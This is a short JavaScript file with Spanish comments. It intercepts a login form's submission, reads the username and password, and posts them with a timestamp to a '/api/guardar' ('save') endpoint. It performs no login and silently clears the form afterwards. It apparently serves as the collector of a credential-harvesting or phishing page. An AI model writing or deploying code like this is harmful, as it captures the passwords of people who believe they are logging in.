document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Evita que la página se recargue

    // Obtener los valores del formulario
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const data = {
        usuario: username,
        contrasena: password,
        fecha: new Date().toISOString()
    };

    // Enviar los datos al servidor backend
    fetch('/api/guardar', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        if (data.error) {
            // Si hay un error, lo mostramos solo en la consola (F12)
            console.error('Error del servidor:', data.error);
        } else {
            // Si todo sale bien, lo mostramos solo en la consola (F12)
            console.log('Conexión exitosa (Datos guardados correctamente)');
            document.getElementById('loginForm').reset(); // Limpia el formulario silenciosamente
        }
    })
    .catch((error) => {
        // Si falla la conexión con el servidor, lo mostramos en la consola
        console.error('Error de red:', error);
    });
});